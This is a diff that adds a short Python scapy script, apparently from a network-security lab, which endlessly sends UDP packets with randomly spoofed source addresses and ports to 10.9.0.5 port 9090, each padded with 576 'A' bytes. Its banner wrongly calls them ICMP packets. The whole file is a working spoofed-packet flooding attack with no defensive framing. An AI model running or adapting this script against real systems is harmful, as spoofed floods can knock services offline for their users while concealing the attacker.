@@ -1,0 +1,16 @@
+#!/usr/bin/python3
+from scapy.all import *
+from ipaddress import IPv4Address
+from random import getrandbits
+
+print("SENDING SPOOFED ICMP PACKETS .........")
+
+while True:
+    ip = IP(dst="10.9.0.5")
+    ip.src = str(IPv4Address(getrandbits(32)))
+    udp = UDP()
+    udp.sport=getrandbits(16)
+    udp.dport=9090
+    data = "A" * 576
+    pkt = ip/udp/data
+    send(pkt,verbose=0)
